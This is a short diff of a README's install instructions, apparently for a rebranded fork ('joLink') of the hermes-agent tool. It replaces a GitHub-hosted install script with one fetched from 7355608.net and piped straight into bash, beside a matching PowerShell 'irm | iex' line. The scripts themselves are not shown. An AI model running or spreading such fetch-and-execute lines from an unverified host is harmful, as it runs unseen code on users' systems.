@@ -36,7 +36,7 @@ irm https://7355608.net/jolink/install.ps1 | iex
 ### macOS / Linux
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/L1ch404/hermes-agent/main/scripts/install.sh | bash
+curl -fsSL https://7355608.net/jolink/install.sh | bash
 ```
 
 安装器会完成 Python、虚拟环境和依赖安装。joLink 目前保留兼容命令 `hermes`
